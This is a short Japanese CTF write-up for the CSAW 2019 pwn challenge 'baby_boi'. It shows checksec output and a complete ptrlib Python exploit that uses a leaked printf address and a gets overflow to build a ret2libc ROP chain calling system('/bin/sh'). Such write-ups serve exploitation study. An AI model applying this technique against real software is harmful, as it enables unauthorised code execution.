# [pwn 50pts] baby_boi - CSAW CTF Qualification 2019
64ビットバイナリで、DEP以外無効です。
```
$ checksec -f baby_boi
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols     No       0               4       baby_boi
```
IDAで解析すると、printfのアドレスが貰えたあとにgetsがあるので、単純なBOFです。
```python
from ptrlib import *

libc = ELF("./libc-2.27.so")
sock = Process("./baby_boi")

sock.recvuntil(": ")
libc_base = int(sock.recvline(), 16) - libc.symbol("printf")
logger.info("libc base = " + hex(libc_base))

payload = b'A' * 0x28
payload += p64(0x00400794)
payload += p64(0x00400793)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
sock.sendline(payload)

sock.interactive()
```

# 感想
簡単ですね。
